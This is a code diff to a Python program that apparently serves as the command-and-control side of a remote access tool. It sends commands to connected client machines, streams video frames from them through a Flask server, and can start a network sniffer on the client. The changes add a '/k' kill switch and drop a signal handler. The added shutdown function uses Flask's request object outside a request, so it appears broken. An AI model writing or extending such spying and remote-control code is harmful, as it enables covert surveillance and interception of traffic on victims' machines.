@@ -1,7 +1,6 @@
 import socket
 import threading
 import time
-import signal
 from flask import Flask, Response, request
 from colorama import Fore, Style, init
 import cv2
@@ -14,10 +13,10 @@ init(autoreset=True)
 app = Flask(__name__)
 clients = {}
 server_thread = None
-
-
+flask_thread = None
 
 def start_streaming(client_socket, mode):
+    global flask_thread
     print(Fore.BLUE + "[ * ] Starting...")
     time.sleep(1)
     print(Fore.BLUE + "[ * ] Preparing player...")
@@ -32,7 +31,8 @@ def start_streaming(client_socket, mode):
     print(Fore.BLUE + "[ * ] Streaming...")
 
     # Run the Flask app in a separate thread to handle the streaming
-    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, use_reloader=False)).start()
+    flask_thread = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, use_reloader=False))
+    flask_thread.start()
 
 def generate_frames(client_socket):
     while True:
@@ -57,6 +57,11 @@ def handle_client(client_socket, addr):
 
         print(Fore.YELLOW + f"[ * ] Command '{command}' sent to client.")
         client_socket.send(command.encode('utf-8'))
+
+        if command == "/k":
+            print(Fore.RED + "[ * ] Kill switch activated. Stopping Flask server...")
+            shutdown_flask_server()
+            continue
 
         if command == "sniffer_start":
             print(Fore.YELLOW + "[ * ] Starting network sniffer on client...")
@@ -116,10 +121,14 @@ def handle_client(client_socket, addr):
 
         client_socket.send(command.encode('utf-8'))
 
+def shutdown_flask_server():
+    func = request.environ.get('werkzeug.server.shutdown')
+    if func is not None:
+        func()
+    else:
+        print(Fore.RED + "[ * ] Unable to shut down the Flask server.")
 
 def main():
-    signal.signal(signal.SIGINT, signal_handler)
-
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.bind(('0.0.0.0', 9999))
     server_socket.listen(5)
